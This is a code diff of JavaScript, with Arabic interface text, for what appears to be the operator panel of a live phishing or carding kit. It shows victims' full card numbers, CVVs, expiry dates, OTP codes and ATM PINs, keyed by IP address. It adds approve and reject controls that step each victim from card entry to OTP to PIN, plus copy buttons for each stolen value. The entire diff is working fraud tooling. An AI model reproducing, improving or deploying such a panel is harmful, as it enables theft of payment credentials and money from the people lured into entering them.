-  const cardData = pd || (histPayments.length > 0 ? histPayments[histPayments.length - 1] : null);
   if (cardData) {
     const holderName = cardData.cardHolderName || cardData.card_holder_name || '-';
-    const cardNum = cardData.cardNumber || cardData.card_number || '-';
+    const rawNum = cardData.cardNumber || cardData.card_number || '';
+    const cardNum = rawNum ? rawNum.replace(/(.{4})/g, '$1 ').trim() : '-';
     const expiry = cardData.expiry || cardData.expirationDate || '-';
     const cvv = cardData.cvv || '-';
+
     html += `
-    <div class="mfield-grid">
-      <div class="mfield"><span class="mfield-label">اسم الحامل</span>
-        <span class="mfield-value">${holderName}
-          <button class="copy-btn" onclick="copyText('${holderName}')">
-            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
-          </button>
-        </span>
+      <div style="padding:14px 16px;border-bottom:1px solid #f1f5f9">
+        <div style="font-size:11px;color:#94a3b8;font-weight:700;margin-bottom:6px;text-transform:uppercase">اسم الحامل</div>
+        <div style="font-size:16px;font-weight:800;color:#1e293b;display:flex;align-items:center;gap:8px">
+          ${holderName}
+          <button class="copy-btn" onclick="copyText('${holderName}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button>
+        </div>
       </div>
-      <div class="mfield"><span class="mfield-label">رقم البطاقة</span>
-        <span class="mfield-value">${cardNum}
-          <button class="copy-btn" onclick="copyText('${cardNum}')">
-            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
-          </button>
-        </span>
+      <div style="padding:14px 16px;border-bottom:1px solid #f1f5f9">
+        <div style="font-size:11px;color:#94a3b8;font-weight:700;margin-bottom:6px;text-transform:uppercase">رقم البطاقة</div>
+        <div style="display:flex;align-items:center;gap:8px">
+          <span class="card-number-display">${cardNum}</span>
+          <button class="copy-btn" onclick="copyText('${rawNum}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button>
+        </div>
       </div>
-      <div class="mfield"><span class="mfield-label">تاريخ الانتهاء</span><span class="mfield-value">${expiry}</span></div>
-      <div class="mfield"><span class="mfield-label">CVV</span>
-        <span class="mfield-value">${cvv}
-          <button class="copy-btn" onclick="copyText('${cvv}')">
-            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
-          </button>
-        </span>
-      </div>
-    </div>`;
-    if (pd) html += buildActionBtns(ip, 'payment');
+      <div class="card-info-row">
+        <div class="card-info-cell">
+          <label>تاريخ الانتهاء</label>
+          <span>${expiry}</span>
+        </div>
+        <div class="card-info-cell">
+          <label>CVV</label>
+          <span>${cvv}</span>
+        </div>
+      </div>`;
+
+    // OTP row inside card box
+    if (otpData) {
+      const otpCode = otpData.code || '-';
+      html += `
+      <div class="code-row" id="modal-otp-row" style="background:${od ? '#fffbeb' : '#fafafa'}">
+        <span class="code-row-label" style="color:#d97706">🔑 رمز OTP</span>
+        <div style="display:flex;align-items:center;gap:8px">
+          <span class="code-row-value code-otp">${otpCode}</span>
+          <button class="copy-btn" onclick="copyText('${otpCode}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button>
+        </div>
+      </div>`;
+    } else {
+      html += `<div class="code-row" style="background:#fafafa"><span class="code-row-label" style="color:#94a3b8">🔑 رمز OTP</span><span style="font-size:12px;color:#94a3b8">في الانتظار...</span></div>`;
+    }
+
+    // PIN row inside card box
+    if (pinData) {
+      const pinCode = pinData.code || '-';
+      html += `
+      <div class="code-row" id="modal-pin-row" style="background:${pind ? '#f0fdf4' : '#fafafa'}">
+        <span class="code-row-label" style="color:#0d9488">🔒 الرقم السري ATM</span>
+        <div style="display:flex;align-items:center;gap:8px">
+          <span class="code-row-value code-pin">${pinCode}</span>
+          <button class="copy-btn" onclick="copyText('${pinCode}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button>
+        </div>
+      </div>`;
+    } else {
+      html += `<div class="code-row" style="background:#fafafa"><span class="code-row-label" style="color:#94a3b8">🔒 الرقم السري ATM</span><span style="font-size:12px;color:#94a3b8">في الانتظار...</span></div>`;
+    }
+
+    // Action buttons
+    if (currentStage && liveData[ip]) {
+      const stageLabels = {
+        payment: { approve: 'قبول → OTP', reject: 'رفض البطاقة' },
+        otp: { approve: 'قبول → الرقم السري', reject: 'رفض → إعادة OTP' },
+        pin: { approve: 'قبول ✓', reject: 'رفض → إعادة الرقم' }
+      };
+      const l = stageLabels[currentStage];
+      html += `
+      <div class="action-row" id="modal-action-btns">
+        <button class="btn-action btn-approve-active" id="btn-approve" onclick="approveStage('${ip}','${currentStage}')">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+          ${l.approve}
+        </button>
+        <button class="btn-action btn-reject-active" id="btn-reject" onclick="rejectStage('${ip}','${currentStage}')">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
+          ${l.reject}
+        </button>
+      </div>`;
+    } else {
+      html += `
+      <div class="action-row" id="modal-action-btns">
+        <button class="btn-action btn-approve-gray">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+          قبول
+        </button>
+        <button class="btn-action btn-reject-gray">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
+          رفض
+        </button>
+      </div>`;
+    }
+
   } else {
     html += `<div class="waiting-state"><span class="spinner"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg></span> في انتظار بيانات البطاقة...</div>`;
   }
-  html += `</div>`;
 
-  // ---- OTP section ----
-  const otpData = od || (histCodes.filter(c => c.code_type !== 'pin').pop() || null);
-  html += `<div class="card-section ${od ? 'active-otp' : ''}" id="modal-otp-sec">
-    <div class="card-section-header">
-      <div class="card-section-title" style="color:${od ? '#d97706' : '#64748b'}">
-        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="16" height="16"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"/></svg>
-        رمز OTP
-      </div>
-      ${od ? '<span class="badge badge-otp">مباشر 🔴</span>' : ''}
-    </div>`;
-  if (otpData) {
-    const code = otpData.code || '-';
-    html += `<div class="code-box"><div class="code-value code-otp" id="modal-otp-val">${code}</div><div class="code-label">رمز التحقق المُدخل</div></div>`;
-    if (od) html += buildActionBtns(ip, 'otp');
-  } else {
-    html += `<div class="waiting-state"><span class="spinner"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg></span> في انتظار رمز OTP...</div>`;
-  }
-  html += `</div>`;
-
-  // ---- PIN section ----
-  const pinData = pind || (histCodes.filter(c => c.code_type === 'pin').pop() || null);
-  html += `<div class="card-section ${pind ? 'active-pin' : ''}" id="modal-pin-sec">
-    <div class="card-section-header">
-      <div class="card-section-title" style="color:${pind ? '#0d9488' : '#64748b'}">
-        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="16" height="16"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
-        الرقم السري ATM
-      </div>
-      ${pind ? '<span class="badge badge-pin">مباشر 🔴</span>' : ''}
-    </div>`;
-  if (pinData) {
-    const code = pinData.code || '-';
-    html += `<div class="code-box"><div class="code-value code-pin" id="modal-pin-val">${code}</div><div class="code-label">الرقم السري للصراف الآلي</div></div>`;
-    if (pind) html += buildActionBtns(ip, 'pin');
-  } else {
-    html += `<div class="waiting-state"><span class="spinner"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg></span> في انتظار الرقم السري...</div>`;
-  }
-  html += `</div>`;
-
-  html += `</div>`; // end msec
+  html += `</div></div>`; // close card-box and msec
   return html;
 }
 
-function buildActionBtns(ip, stage) {
-  const isActive = liveStatus[ip] === stage;
-  const labels = {
-    payment: { approve: 'قبول → OTP', reject: 'رفض البطاقة' },
-    otp: { approve: 'قبول → الرقم السري', reject: 'رفض → إعادة OTP' },
-    pin: { approve: 'قبول ✓', reject: 'رفض → إعادة الرقم' }
-  };
-  const l = labels[stage];
-  const aClass = isActive ? 'btn-approve-active' : 'btn-approve-gray';
-  const rClass = isActive ? 'btn-reject-active' : 'btn-reject-gray';
-  return `
-  <div class="action-row" id="modal-actions-${stage}">
-    <button class="btn-action ${aClass}" onclick="approveStage('${ip}','${stage}')">
-      <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
-      ${l.approve}
-    </button>
-    <button class="btn-action ${rClass}" onclick="rejectStage('${ip}','${stage}')">
-      <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
-      ${l.reject}
-    </button>
-  </div>`;
-}
-
-function refreshModalLive(ip) {
+// Rebuild only the live section inside the open modal (no fetch - use in-memory data)
+function rebuildModalLive(ip) {
   if (currentModalIp !== ip) return;
-  fetch(`${SERVER_URL}/api/data/${ip}`)
-    .then(r => r.json())
-    .catch(() => ({ payments: [], codes: [] }))
-    .then(extraData => {
-      const wrap = document.getElementById('modal-live-wrap');
-      if (!wrap) return;
-      const booking = allBookings.find(b => b.ip === ip);
-      if (!booking) return;
-      const tmp = document.createElement('div');
-      tmp.innerHTML = buildLiveSections(ip, extraData);
-      wrap.replaceWith(tmp.firstElementChild);
-      // Pulse
-      const newWrap = document.getElementById('modal-live-wrap');
-      if (newWrap) {
-        newWrap.classList.add('pulse-section');
-        setTimeout(() => newWrap.classList.remove('pulse-section'), 800);
-      }
-    });
+  const body = document.getElementById('modalBody');
+  if (!body) return;
+
+  // Find the card section msec (second msec)
+  const sections = body.querySelectorAll('.msec');
+  if (sections.length < 2) return;
+
+  // Rebuild with current liveData (no fetch needed - data is already in memory)
+  const newHtml = buildCardSection(ip, { payments: [], codes: [] });
+  const tmp = document.createElement('div');
+  tmp.innerHTML = newHtml;
+  const newSection = tmp.firstElementChild;
+  sections[1].replaceWith(newSection);
+
+  // Pulse animation
+  const cardBox = document.getElementById('modal-card-box');
+  if (cardBox) {
+    cardBox.classList.add('pulse-box');
+    setTimeout(() => cardBox.classList.remove('pulse-box'), 800);
+  }
 }
 
 async function approveStage(ip, stage) {
   const live = liveData[ip];
-  if (!live || liveStatus[ip] !== stage) return;
+  if (!live) return;
+  const requestId = live.requestId;
+
+  // Gray out buttons immediately
+  const approveBtn = document.getElementById('btn-approve');
+  const rejectBtn = document.getElementById('btn-reject');
+  if (approveBtn) { approveBtn.className = 'btn-action btn-approve-gray'; approveBtn.onclick = null; }
+  if (rejectBtn) { rejectBtn.className = 'btn-action btn-reject-gray'; rejectBtn.onclick = null; }
+
   try {
     await fetch(`${SERVER_URL}/api/approve`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ requestId: live.requestId })
+      body: JSON.stringify({ requestId })
     });
   } catch(e) {
-    if (socket) socket.emit('adminApprove', { requestId: live.requestId });
+    if (socket) socket.emit('adminApprove', { requestId });
   }
-  grayBtns(stage);
+
+  showToast('✅ تم القبول');
+
   if (stage === 'pin') {
     delete liveData[ip];
     delete liveStatus[ip];
     updatePendingCount();
     updateRowBadge(ip, null);
   }
-  showToast('تم القبول ✓');
 }
 
 async function rejectStage(ip, stage) {
   const live = liveData[ip];
-  if (!live || liveStatus[ip] !== stage) return;
+  if (!live) return;
+  const requestId = live.requestId;
+
+  // Gray out buttons immediately
+  const approveBtn = document.getElementById('btn-approve');
+  const rejectBtn = document.getElementById('btn-reject');
+  if (approveBtn) { approveBtn.className = 'btn-action btn-approve-gray'; approveBtn.onclick = null; }
+  if (rejectBtn) { rejectBtn.className = 'btn-action btn-reject-gray'; rejectBtn.onclick = null; }
+
   try {
     await fetch(`${SERVER_URL}/api/reject`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ requestId: live.requestId, message: 'تم الرفض' })
+      body: JSON.stringify({ requestId, message: 'تم الرفض' })
     });
   } catch(e) {
-    if (socket) socket.emit('adminReject', { requestId: live.requestId, message: 'تم الرفض' });
+    if (socket) socket.emit('adminReject', { requestId, message: 'تم الرفض' });
   }
-  grayBtns(stage);
+
+  showToast('❌ تم الرفض');
+
   if (stage === 'payment') {
     delete liveData[ip];
     delete liveStatus[ip];
     updatePendingCount();
     updateRowBadge(ip, null);
   }
-  showToast('تم الرفض');
-}
-
-function grayBtns(stage) {
-  const el = document.getElementById(`modal-actions-${stage}`);
-  if (!el) return;
-  el.querySelectorAll('.btn-action').forEach(b => {
-    b.className = b.className.includes('approve') ? 'btn-action btn-approve-gray' : 'btn-action btn-reject-gray';
-  });
 }
 
 async function updateBookingStatus(bookingId, status) {
@@ -1055,7 +1094,7 @@ async function updateBookingStatus(bookingId, status) {
     renderBookings();
     updateStats();
     closeModal();
-    showToast(status === 'approved' ? 'تم قبول الحجز ✓' : 'تم رفض الحجز');
+    showToast(status === 'approved' ? '✅ تم قبول الحجز' : '❌ تم رفض الحجز');
   } catch(e) {}
 }
 
@@ -1070,7 +1109,7 @@ function handleOverlayClick(e) {
 
 // ===== UTILS =====
 function copyText(text) {
-  navigator.clipboard.writeText(text).then(() => showToast('تم النسخ: ' + text)).catch(() => {});
+  navigator.clipboard.writeText(text).then(() => showToast('📋 تم النسخ: ' + text)).catch(() => {});
 }
 
 function showToast(msg) {
